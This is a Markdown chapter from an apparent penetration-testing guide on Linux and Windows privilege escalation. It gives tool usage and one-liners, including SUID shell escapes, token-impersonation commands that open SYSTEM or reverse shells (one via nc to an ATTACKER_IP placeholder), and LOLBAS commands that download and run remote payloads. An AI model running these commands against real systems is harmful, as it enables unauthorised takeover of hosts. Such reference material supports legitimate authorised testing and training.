<div align="center">

| Previous Phase | Next Phase |
|:-------------------------------------------:|:---------------------------------------------:|
| [Exploitation](4.0-Exploitation.md) | [Post-Exploitattion](../5-Post-exploitation/5.0-Post-Exploitation.md) |

</div>

<br>
<br>
<br>

# Privilege Escalation

Privilege Escalation involves going from a lower permission account to a higher permission one through exploitation of vulnerabilities, misconfigurations, or design flaws. In this section I separeted Linux Privilege Escalation and Windows Privilege Escalation and the following table is a summary of tools associated with each OS.

<br>

## Tools Reference Table

<p align="center">

| Tool | Platform | Purpose | Link |
|:-----|:---------|:--------|:-----|
| [**LinPEAS**](#linpeas) | Linux | Automated privilege escalation enumeration | [GitHub](https://github.com/carlospolop/PEASS-ng) |
| [**LinEnum**](#linenum) | Linux | Linux enumeration script | [GitHub](https://github.com/rebootuser/LinEnum) |
| [**Linux Exploit Suggester**](#linux-exploit-suggester) | Linux | Kernel exploit suggester | [GitHub](https://github.com/mzet-/linux-exploit-suggester) |
| [**pspy**](#pspy) | Linux | Process monitoring without root | [GitHub](https://github.com/DominicBreuker/pspy) |
| [**GTFOBins**](#gtfobins) | Linux | SUID/sudo binary exploits reference | [gtfobins.github.io](https://gtfobins.github.io/) |
| [**WinPEAS**](#winpeas) | Windows | Automated privilege escalation enumeration | [GitHub](https://github.com/carlospolop/PEASS-ng) |
| [**PowerUp**](#powerup) | Windows | PowerShell privesc script | [GitHub](https://github.com/PowerShellMafia/PowerSploit) |
| [**Seatbelt**](#seatbelt) | Windows | Security-oriented host survey | [GitHub](https://github.com/GhostPack/Seatbelt) |
| [**SharpUp**](#sharpup) | Windows | C# port of PowerUp | [GitHub](https://github.com/GhostPack/SharpUp) |
| [**Windows Exploit Suggester**](#windows-exploit-suggester) | Windows | Kernel exploit suggester | [GitHub](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) |
| [**PrintSpoofer**](#printspoofer) | Windows | Token impersonation (SeImpersonate) | [GitHub](https://github.com/itm4n/PrintSpoofer) |
| [**GodPotato**](#godpotato) | Windows | Token impersonation (all versions) | [GitHub](https://github.com/BeichenDream/GodPotato) |
| [**JuicyPotato**](#juicypotato) | Windows | Token impersonation (older systems) | [GitHub](https://github.com/ohpe/juicy-potato) |
| [**LOLBAS**](#lolbas) | Windows | Living Off The Land binaries reference | [lolbas-project.github.io](https://lolbas-project.github.io/) |

</p>

<br>

> **External References:**
> * [**GhostPack (Seatbelt)**](https://github.com/GhostPack/Seatbelt) - A C# project that performs a massive number of safety-oriented security checks (great for finding misconfigurations without running full exploits).
> * [**Watson**](https://github.com/rasta-mouse/Watson) - A .NET tool designed to enumerate missing KBs (updates) and suggest exploits for Windows 10/Server 2016+ (cleaner alternative to bulky exploit suggesters).
> * [**Deepce**](https://github.com/stealthcopter/deepce) - Docker Enumeration, Escalation of Privileges, and Container Escapes (essential for modern cloud environments).
> * [**UACME**](https://github.com/hfiref0x/UACME) - A massive collection of methods to bypass Windows User Account Control (UAC).
> * [**BeRoot**](https://github.com/AlessandroZ/BeRoot) - Privilege escalation project for Windows, Linux, and Mac to find common misconfigurations.
> * [**FuzzySecurity (Windows PrivEsc)**](https://www.fuzzysecurity.com/tutorials/16.html) - The classic, definitive guide on learning Windows privilege escalation manually.
> * [**G0tmi1k's Linux PrivEsc Guide**](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) - One of the most referenced guides for manual Linux enumeration.
> * [**WADComs**](https://wadcoms.github.io/) - An interactive cheatsheet for Windows/AD commands (helps you build complex one-liners).
> * [**HackTricks (Privilege Escalation)**](https://book.hacktricks.xyz/) - Contains extensive sections on Linux and Windows local privilege escalation techniques.
> * ***Windows Internals, Part 1 & 2*** (Mark Russinovich) - While not an "exploit" book, this is the bible for understanding how Windows works. Understanding tokens, handles, and processes is the key to mastering Windows PrivEsc.
> * ***UNIX and Linux System Administration Handbook*** (Evi Nemeth) - Similar to above; to break the system, you must first understand how to administer it.
> * ***The Hacker Playbook 3*** (Peter Kim) - Features practical labs on moving from initial access to domain dominance.

<br>
<br>
<br>

# Linux Privilege Escalation Tools

<br>

## LinPEAS
> *GitHub: https://github.com/carlospolop/PEASS-ng*

Linux Privilege Escalation Awesome Script - automated enumeration tool that highlights potential privilege escalation vectors.

```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or download first
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Output to file
./linpeas.sh -a > linpeas_output.txt
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-a` | All checks (longer) |
| `-s` | Stealth mode (less noise) |
| `-p` | Password file to check |
| `-o` | Only execute selected checks |

</p>

<br>

## LinEnum
> *GitHub: https://github.com/rebootuser/LinEnum*

Scripted local Linux enumeration and privilege escalation checks.

```bash
# Basic usage
./LinEnum.sh

# Thorough tests
./LinEnum.sh -t

# Export to file
./LinEnum.sh -r report -e /tmp/ -t
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-k` | Enter keyword for search |
| `-e` | Export directory |
| `-t` | Thorough tests |
| `-r` | Report name |

</p>

<br>

## Linux Exploit Suggester
> *GitHub: https://github.com/mzet-/linux-exploit-suggester*

Suggests potential kernel exploits based on system information.

```bash
# Run directly
./linux-exploit-suggester.sh

# Or with uname output
./linux-exploit-suggester.sh --uname "Linux hostname 4.4.0-31-generic"
```

<br>

## pspy
> *GitHub: https://github.com/DominicBreuker/pspy*

Monitor Linux processes without root permissions - useful for finding cron jobs and scheduled tasks.

```bash
# Download appropriate version
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# Run
chmod +x pspy64
./pspy64

# With colors and watch directories
./pspy64 -pf -i 1000
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-p` | Print commands to stdout |
| `-f` | Print file system events |
| `-i` | Interval in milliseconds |
| `-c` | Print in color |

</p>

<br>

## GTFOBins
> *Website: https://gtfobins.github.io/*

Reference for Unix binaries that can be exploited to bypass local security restrictions (SUID, sudo, capabilities).

**Common SUID Binary Exploits:**

<p align="center">

| Binary | Command |
|:-------|:--------|
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `bash` | `bash -p` |
| `nmap` | `nmap --interactive` → `!sh` |
| `python` | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `less` | `less /etc/passwd` → `!/bin/sh` |

</p>

<br>

---

<br>

# Windows Privilege Escalation Tools

<br>

## WinPEAS
> *GitHub: https://github.com/carlospolop/PEASS-ng*

Windows Privilege Escalation Awesome Script - automated enumeration for Windows systems.

```powershell
# Run executable
winPEASx64.exe

# Run with specific checks
winPEASx64.exe quiet systeminfo userinfo

# All checks
winPEASx64.exe quiet cmd fast
```

<p align="center">

| Argument | Description |
|:---------|:------------|
| `quiet` | Less output |
| `fast` | Fast mode |
| `cmd` | Use cmd.exe instead of powershell |
| `systeminfo` | System information only |
| `userinfo` | User information only |
| `servicesinfo` | Services information only |

</p>

<br>

## PowerUp
> *GitHub: https://github.com/PowerShellMafia/PowerSploit*

PowerShell script to find common Windows privilege escalation vectors.

```powershell
# Import module
Import-Module .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Specific checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-RegistryAutoLogon
```

<p align="center">

| Function | Description |
|:---------|:------------|
| `Invoke-AllChecks` | Run all privesc checks |
| `Get-ServiceUnquoted` | Find unquoted service paths |
| `Get-ModifiableServiceFile` | Find modifiable service binaries |
| `Get-ModifiableService` | Find modifiable service configs |
| `Write-ServiceBinary` | Write a malicious service binary |
| `Install-ServiceBinary` | Replace a service binary |

</p>

<br>

## Seatbelt
> *GitHub: https://github.com/GhostPack/Seatbelt*

C# security-oriented host survey tool.

```powershell
# Run all checks
Seatbelt.exe -group=all

# Specific groups
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=misc

# Specific checks
Seatbelt.exe TokenPrivileges
Seatbelt.exe NonstandardServices
```

<p align="center">

| Group | Description |
|:------|:------------|
| `-group=all` | All checks |
| `-group=system` | System-related checks |
| `-group=user` | User-related checks |
| `-group=misc` | Miscellaneous checks |
| `-group=chromium` | Chromium browser checks |
| `-group=remote` | Remote system checks |

</p>

<br>

## SharpUp
> *GitHub: https://github.com/GhostPack/SharpUp*

C# port of PowerUp for situations where PowerShell is restricted.

```powershell
# Run all checks
SharpUp.exe

# Specific check
SharpUp.exe audit ModifiableServices
SharpUp.exe audit UnquotedServicePath
```

<br>

## Windows Exploit Suggester
> *GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester*

Compares systeminfo output against Microsoft vulnerability database.

```bash
# Update database
python windows-exploit-suggester.py --update

# Run against systeminfo output
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt
```

<br>

## PrintSpoofer
> *GitHub: https://github.com/itm4n/PrintSpoofer*

Exploit `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.

```powershell
# Get SYSTEM shell
PrintSpoofer.exe -i -c cmd

# Run specific command
PrintSpoofer.exe -i -c "whoami"

# Reverse shell
PrintSpoofer.exe -i -c "powershell -e <base64_payload>"
```

<p align="center">

| Option | Description |
|:-------|:------------|
| `-i` | Interactive mode |
| `-c` | Command to execute |
| `-d` | Debug mode |

</p>

<br>

## GodPotato
> *GitHub: https://github.com/BeichenDream/GodPotato*

Token impersonation for Windows 8 - Windows 11, Server 2012 - 2022.

```powershell
# Execute command as SYSTEM
GodPotato.exe -cmd "cmd /c whoami"

# Reverse shell
GodPotato.exe -cmd "nc.exe -e cmd.exe <ATTACKER_IP> <PORT>"
```

<br>

## JuicyPotato
> *GitHub: https://github.com/ohpe/juicy-potato*

Token impersonation for older Windows systems (< Windows 10 1809).

```powershell
# Execute command
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# Common CLSID for Windows Server 2016
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {F3A614DC-ABE0-11d2-A441-00C04F795683}
```

<br>

## LOLBAS
> *Website: https://lolbas-project.github.io/*

Living Off The Land Binaries, Scripts and Libraries - legitimate Windows binaries that can be abused.

**Common Examples:**

<p align="center">

| Binary | Use Case | Command |
|:-------|:---------|:--------|
| `certutil.exe` | Download files | `certutil -urlcache -split -f http://url/file.exe file.exe` |
| `mshta.exe` | Execute HTA | `mshta http://url/payload.hta` |
| `rundll32.exe` | Execute DLL | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...` |
| `regsvr32.exe` | Execute SCT | `regsvr32 /s /n /u /i:http://url/file.sct scrobj.dll` |
| `bitsadmin.exe` | Download files | `bitsadmin /transfer job /download http://url/file.exe c:\file.exe` |

</p>

<br>

---

<br>
<br>

<div align="center">

| Previous Page | Next Page |
|:-------------------------------------------:|:---------------------------------------------:|
| [Exploitation](4.0-Exploitation.md) | [Post-Exploitattion](../5-Post-exploitation/5.0-Post-Exploitation.md) |

</div>
